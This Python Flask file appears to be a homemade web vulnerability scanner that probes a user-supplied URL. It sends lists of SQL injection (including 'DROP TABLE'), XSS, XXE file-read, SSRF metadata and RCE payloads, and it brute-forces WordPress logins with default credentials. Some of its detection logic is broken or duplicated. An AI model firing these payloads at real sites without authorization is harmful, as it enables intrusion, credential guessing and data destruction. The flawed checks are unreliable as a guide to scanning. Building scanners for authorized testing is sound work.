from flask import Flask, render_template, request, redirect, url_for
import requests
import time
import os
import joblib
from transformers import AutoTokenizer, TFAutoModelForSequenceClassification
import tensorflow as tf
import numpy as np
import html
from datetime import datetime

# Ensure TensorFlow uses memory on-demand
gpus = tf.config.experimental.list_physical_devices('GPU')
if gpus:
    for gpu in gpus:
        tf.config.experimental.set_memory_growth(gpu, True)

app = Flask(__name__)


# Initialize the tokenizer and model globally for vulnerability classification
tokenizer = AutoTokenizer.from_pretrained("microsoft/codebert-base")
model = TFAutoModelForSequenceClassification.from_pretrained("microsoft/codebert-base")

# Load the anomaly detection model
model_file = './anomaly_detection_model.joblib'
vectorizer, anomaly_model = joblib.load(model_file)

# List of common paths to check for vulnerabilities and their descriptions (OWASP top 10)
vulnerability_checks = {
    'wp-admin/install.php': "WordPress installation script is accessible.",
    'wp-login.php': "WordPress login page is exposed.",
    'wp-content/debug.log': "Debug log file is accessible.",
    'wp-json/wp/v2/users': "REST API user enumeration might be possible.",
    '.env': "Environment file may expose sensitive configuration information.",
    'xmlrpc.php': "XML-RPC interface could allow DDoS or brute-force attacks.",
    '.git/': "Git directory exposure could reveal sensitive information or source code.",
    'phpinfo.php': "phpinfo() file could expose server configuration details.",
    'wp-config.php.bak': "Backup of wp-config file could contain sensitive information.",
    'backup.sql': "SQL backup file might expose database contents."
}

# Vulnerability payloads based on OWASP Top 10 categories
sql_injection_tests = ["'", "' OR '1'='1", "'; DROP TABLE users; --", "' OR '1'='2", "admin' --", "' UNION SELECT NULL, NULL"]
xss_tests = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS') />", "<div onmouseover='alert(\"XSS\")'>Hover</div>"]
xxe_payloads = ["<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"]
ssrf_payloads = ['http://localhost', 'http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/']
rce_payloads = ['phpinfo()', 'system("ls")', 'system("cat /etc/passwd")']
access_control_tests = ["/admin", "/admin/config.php", "/admin/backup", "/admin/.git", "/admin/.env", "/admin/users.php"]
security_misconfigurations = ["/server-status", "/server-info", "/.git/", "/phpinfo.php", "/backup.sql"]
# List of common username and password combinations for brute-force attack
login_tests = [
    ('admin', 'password'),  
    ('admin', 'admin'),  
    ('root', 'password'),  
    ('test', 'test'),  
    ('admin', '123456'),  
    ('user', 'password'),  
    ('administrator', 'admin'),  
    ('admin', 'pass1234'),  
    ('guest', 'guest'),  
    ('root', 'root')
]
# List of XSS payloads designed for different contexts and bypassing filters
xss_payloads = [
    "<script>alert('XSS')</script>",                        # Basic script injection
    "<img src=x onerror=alert('XSS') />",                   # XSS in image tag
    "<svg/onload=alert('XSS')>",                            # XSS in SVG element
    "<body onload=alert('XSS')>",                           # XSS in body onload
    "';alert('XSS');//",                                    # XSS with single quote and comment bypass
    "<iframe src=javascript:alert('XSS')>",                 # XSS in iframe tag
    "<input type='text' onfocus='alert(1)' autofocus>",     # XSS in input element with focus event
    "<div onmouseover='alert(\"XSS\")'>Hover me!</div>",    # XSS in div tag with mouseover event
    "javascript:alert('XSS')",                              # XSS in href attribute (href="javascript:...")
    "'';!--\"<XSS>=&{()}",                                  # Obfuscated XSS payload
]



# Function to classify vulnerability using the pre-trained model
def classify_vulnerability(text):
    inputs = tokenizer(text, return_tensors="tf", truncation=True, padding=True, max_length=512)
    outputs = model(inputs)
    prediction = tf.nn.softmax(outputs.logits, axis=-1)
    return prediction.numpy()[0]

# Function to detect anomalies in server responses
def detect_anomalies(responses):
    X = vectorizer.transform(responses)
    anomalies = anomaly_model.predict(X)
    return anomalies

# Function to check if a URL is vulnerable
def check_vulnerability(url, description):
    result = ""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            content = response.text
            vulnerability_scores = classify_vulnerability(content)
            vulnerability_type = ["SQL Injection", "XSS", "CSRF", "RCE", "Other"][np.argmax(vulnerability_scores)]
            confidence = np.max(vulnerability_scores)
            result = f"[VULNERABLE] {url} - {description} (Type: {vulnerability_type}, Confidence: {confidence:.2f})"
        elif response.status_code == 403:
            result = f"[INFO] Access denied at: {url} (403 Forbidden)"
        elif response.status_code == 404:
            result = f"[INFO] Not found: {url} (404 Not Found)"
        else:
            result = f"[INFO] Unexpected status code {response.status_code} at: {url}"
    except requests.RequestException as e:
        result = f"[ERROR] Error checking {url}: {e}"
    
    return result

# Function to check for SQL injection and XSS vulnerabilities
def check_input_vulnerabilities(url):
    for test in sql_injection_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            if "SQL" in response.text or "syntax" in response.text:
                result = f"[VULNERABLE] SQL Injection possible at: {url} with payload: {test}"
                log_vulnerability(url, f"SQL Injection possible with payload: {test}", "CRITICAL")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error checking for SQL Injection at {url}: {e}"
            log_vulnerability(url, f"SQL Injection check error: {e}", "ERROR")
            print(result)

    for test in xss_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            if "<script>" in response.text or "alert('XSS')" in response.text:
                escaped_test = html.escape(test)
                result = f"[VULNERABLE] XSS possible at: {url} with payload: {escaped_test}"
                log_vulnerability(url, f"XSS possible with payload: {escaped_test}", "CRITICAL")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error checking for XSS at {url}: {e}"
            log_vulnerability(url, f"XSS check error: {e}", "ERROR")
            print(result)

# Function to check for SQL injection vulnerabilities
def check_sql_injection(url):
    results = []
    for test in sql_injection_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            # Check for SQL error indicators in the response
            if "SQL" in response.text or "syntax" in response.text:
                result = f"[VULNERABLE] SQL Injection possible at: {url} with payload: {test}"
                results.append(result)  # Only append if the payload is successful
        except requests.RequestException as e:
            print(f"Error during SQL Injection check: {e}")
    return results

# Function to check for XSS vulnerabilities
def check_xss(url):
    results = []
    
    # Loop through each XSS payload for testing
    for payload in xss_payloads:
        try:
            print(f"Testing XSS on: {url} with payload: {payload}")  # Debug log
            
            # Send the XSS payload in the query string
            response = requests.get(f"{url}?test={payload}", timeout=10)
            
            # Check if the payload is reflected in the response (even partially)
            if payload in response.text:
                escaped_payload = html.escape(payload)
                result = f"[VULNERABLE] Reflected XSS possible at: {url} with payload: {escaped_payload}"
                results.append(result)
                log_vulnerability(url, f"Reflected XSS possible with payload: {escaped_payload}", "CRITICAL")
            else:
                # Check for partial reflection (obfuscated XSS payloads)
                for i in range(len(payload)):
                    if payload[:i] in response.text:
                        result = f"[POTENTIALLY VULNERABLE] Partial XSS reflection detected at: {url} with payload: {payload}"
                        results.append(result)
                        log_vulnerability(url, f"Partial XSS reflection detected with payload: {payload}", "WARNING")
                        break
                else:
                    print(f"No XSS vulnerability detected at: {url} with payload: {payload}")
        
        except requests.RequestException as e:
            print(f"Error during XSS check at {url}: {e}")  # Log the exception for debugging
    
    return results

def check_xss(url):
    results = []
    for test in xss_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            if "<script>" in response.text or "alert('XSS')" in response.text:
                escaped_test = html.escape(test)
                result = f"[VULNERABLE] XSS possible at: {url} with payload: {escaped_test}"
                results.append(result)  # Only append if XSS payload succeeds
        except requests.RequestException as e:
            print(f"Error during XSS check: {e}")
    return results


# Function to check for XXE vulnerabilities
def check_xxe(url):
    results = []
    for test in xxe_payloads:
        try:
            print(f"Testing XXE on: {url} with payload: {test}")  # Debug log
            # Send the payload using a POST request with XML content type
            response = requests.post(url, data=test, headers={'Content-Type': 'application/xml'}, timeout=10)

            # Check for typical XXE exploitation evidence (e.g., presence of '/etc/passwd')
            if "root" in response.text or "/etc/passwd" in response.text:
                escaped_test = html.escape(test)
                result = f"[VULNERABLE] XXE possible at: {url} with payload: {escaped_test}"
                results.append(result)  # Append only if XXE vulnerability is detected
                log_vulnerability(url, f"XXE possible with payload: {escaped_test}", "CRITICAL")
            else:
                print(f"No XXE vulnerability detected at: {url} with payload: {test}")

        except requests.RequestException as e:
            print(f"Error during XXE check at {url}: {e}")  # Log the exception for debugging

    return results


# Function to check for SSRF vulnerabilities
def check_ssrf(url):
    results = []
    for payload in ssrf_payloads:
        try:
            print(f"Testing SSRF on: {url} with payload: {payload}")  # Debug log
            response = requests.get(f"{url}?test={payload}", timeout=10)
            
            # Only append if SSRF vulnerability is detected (status 200 might indicate a success)
            if response.status_code == 200:
                result = f"[VULNERABLE] SSRF possible at: {url} with payload: {payload}"
                log_vulnerability(url, f"SSRF possible with payload: {payload}", "CRITICAL")
                results.append(result)
            else:
                print(f"No SSRF vulnerability detected at: {url} with payload: {payload}")
                
        except requests.RequestException as e:
            print(f"Error during SSRF check at {url}: {e}")  # Log the exception

    return results

# Function to check for RCE vulnerabilities
def check_rce(url):
    results = []
    for payload in rce_payloads:
        try:
            print(f"Testing RCE on: {url} with payload: {payload}")  # Debug log
            response = requests.get(f"{url}?cmd={payload}", timeout=10)
            
            # Only append if RCE vulnerability is detected (look for common indicators)
            if "phpinfo" in response.text or "ls" in response.text:
                escaped_payload = html.escape(payload)
                result = f"[VULNERABLE] RCE possible at: {url} with payload: {escaped_payload}"
                log_vulnerability(url, f"RCE possible with payload: {escaped_payload}", "CRITICAL")
                results.append(result)
            else:
                print(f"No RCE vulnerability detected at: {url} with payload: {payload}")
                
        except requests.RequestException as e:
            print(f"Error during RCE check at {url}: {e}")  # Log the exception

    return results




# Function to perform brute force login attempts
def brute_force_login(url, login_tests):
    results = []
    login_url = url + 'wp-login.php'  # Example login page, adjust if needed
    
    for username, password in login_tests:
        try:
            # Simulate a login attempt by sending POST request
            response = requests.post(login_url, data={'log': username, 'pwd': password}, timeout=10)
            
            # Check if brute force succeeded (login page reloads without error)
            if response.status_code == 200 and "wp-login.php" in response.url:
                result = f"[VULNERABLE] Brute force succeeded with username '{username}' and password '{password}' at {login_url}"
                log_vulnerability(login_url, f"Brute force login succeeded with username '{username}' and password '{password}'", "CRITICAL")
                results.append(result)
            else:
                print(f"Brute force login failed for username '{username}' and password '{password}'")

        except requests.RequestException as e:
            print(f"Error during brute force attempt at {login_url}: {e}")  # Log the exception
    
    return results


# Function to log vulnerabilities to an HTML file
def log_vulnerability(url, message, level):
    with open("vulnerability_report.html", "a") as log_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        css_class = level.lower()
        escaped_message = html.escape(message)
        log_file.write(f"<tr class='{css_class}'><td>{timestamp}</td><td>{level}</td><td>{url}</td><td>{escaped_message}</td></tr>\n")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        return redirect(url_for('scan_report', url=url))
    return render_template('index.html')

@app.route('/report', methods=['GET'])
# def scan_report():
#     url = request.args.get('url')
#     results = []
#     responses = []

#     # Perform vulnerability scans for each path
#     for path, description in vulnerability_checks.items():
#         full_url = url + path
#         result = check_vulnerability(full_url, description)
        
#         # Only append if the check returns a vulnerable result
#         if "[VULNERABLE]" in result:
#             results.append((path, result, 5))  # Pass (path, result, rating)

#         # Perform SQL Injection, XSS, XXE, SSRF, RCE tests
#         sql_results = check_sql_injection(full_url)
#         xss_results = check_xss(full_url)
#         xxe_results = check_xxe(full_url)
#         ssrf_results = check_ssrf(full_url)
#         rce_results = check_rce(full_url)

#         # Only add results for vulnerabilities found
#         results.extend([(path, res, 7) for res in sql_results if "[VULNERABLE]" in res])
#         results.extend([(path, res, 6) for res in xss_results if "[VULNERABLE]" in res])
#         results.extend([(path, res, 4) for res in xxe_results if "[VULNERABLE]" in res])
#         results.extend([(path, res, 8) for res in ssrf_results if "[VULNERABLE]" in res])
#         results.extend([(path, res, 9) for res in rce_results if "[VULNERABLE]" in res])

#         # Collect responses for anomaly detection
#         try:
#             response = requests.get(full_url, timeout=10)
#             responses.append(response.text)
#         except requests.RequestException:
#             responses.append("")  # Add an empty string if request fails
#         time.sleep(1)  # To avoid overloading the server

#     # Perform brute force login attempts (only append vulnerable results)
#     brute_force_results = brute_force_login(url, login_tests)
#     results.extend([(url, res, 10) for res in brute_force_results if "[VULNERABLE]" in res])

#     # Detect anomalies in the responses
#     if responses:
#         anomalies = detect_anomalies(responses)
#         for i, is_anomaly in enumerate(anomalies):
#             if is_anomaly == -1:  # -1 indicates an anomaly
#                 results[i] = (results[i][0], results[i][1] + " [ANOMALOUS RESPONSE DETECTED]", results[i][2])

#     # Pass only vulnerable results to the template
#     return render_template('report.html', url=url, results=results)
@app.route('/report', methods=['GET'])
def scan_report():
    url = request.args.get('url')
    results = []
    responses = []

    # Perform vulnerability scans for each path
    for path, description in vulnerability_checks.items():
        full_url = url + path
        
        try:
            result = check_vulnerability(full_url, description)
        except Exception as e:
            result = f"[ERROR] Could not check {full_url} for vulnerabilities: {e}"
            log_vulnerability(full_url, f"Error during vulnerability check: {e}", "ERROR")
        
        # Only append if the check returns a vulnerable result
        if "[VULNERABLE]" in result:
            results.append((path, result, 5))  # Pass (path, result, rating)

        # Perform SQL Injection, XSS, XXE, SSRF, RCE tests
        try:
            sql_results = check_sql_injection(full_url)
            results.extend([(path, res, 7) for res in sql_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during SQL Injection check: {e}", "ERROR")

        try:
            xss_results = check_xss(full_url)
            results.extend([(path, res, 6) for res in xss_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during XSS check: {e}", "ERROR")
        
        try:
            xxe_results = check_xxe(full_url)
            results.extend([(path, res, 4) for res in xxe_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during XXE check: {e}", "ERROR")
        
        try:
            ssrf_results = check_ssrf(full_url)
            results.extend([(path, res, 8) for res in ssrf_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during SSRF check: {e}", "ERROR")
        
        try:
            rce_results = check_rce(full_url)
            results.extend([(path, res, 9) for res in rce_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during RCE check: {e}", "ERROR")

        # Collect responses for anomaly detection
        try:
            response = requests.get(full_url, timeout=10)
            responses.append(response.text)
        except requests.RequestException:
            responses.append("")  # Add an empty string if request fails
        time.sleep(1)  # To avoid overloading the server

    # Perform brute force login attempts (only append vulnerable results)
    try:
        brute_force_results = brute_force_login(url, login_tests)
        results.extend([(url, res, 10) for res in brute_force_results if "[VULNERABLE]" in res])
    except Exception as e:
        log_vulnerability(url, f"Error during brute force check: {e}", "ERROR")

    # Detect anomalies in the responses
    if responses:
        try:
            anomalies = detect_anomalies(responses)
            for i, is_anomaly in enumerate(anomalies):
                if is_anomaly == -1:  # -1 indicates an anomaly
                    results[i] = (results[i][0], results[i][1] + " [ANOMALOUS RESPONSE DETECTED]", results[i][2])
        except Exception as e:
            log_vulnerability(url, f"Error during anomaly detection: {e}", "ERROR")

    # Pass only vulnerable results to the template
    return render_template('report.html', url=url, results=results)


if __name__ == "__main__":
        #app.run(debug=True)
        pass
